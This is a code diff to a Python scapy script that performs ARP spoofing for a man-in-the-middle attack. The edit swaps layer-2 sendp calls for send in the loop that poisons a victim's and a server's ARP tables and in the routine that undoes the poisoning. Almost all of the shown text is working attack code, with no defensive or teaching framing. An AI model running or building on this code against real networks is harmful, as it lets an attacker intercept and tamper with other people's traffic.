@@ -1,4 +1,4 @@
-from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, sendp
+from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, send
 
 import time
 import random as rd
@@ -37,8 +37,8 @@ def MIMspoofARP(ipVictim, ipServer):
     try:
         while(True):
 #             print("Poisoning Arp table")
-            sendp(arp1, iface=interface, verbose=False)
-            sendp(arp2, iface=interface, verbose=False)
+            send(arp1, verbose=False)
+            send(arp2, verbose=False)
             time.sleep(2)
     except KeyboardInterrupt:
         undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
@@ -48,8 +48,8 @@ def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
     undoVictim = ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
     undoServer = ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)
 
-    sendp(undoVictim, iface=interface, count=4, verbose=False)
-    sendp(undoServer, iface=interface, count=4, verbose=False)
+    send(undoVictim, count=4, verbose=False)
+    send(undoServer, count=4, verbose=False)
 
 def prepPacket(targetMAC, targetIP, spoofedIP):
     arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)
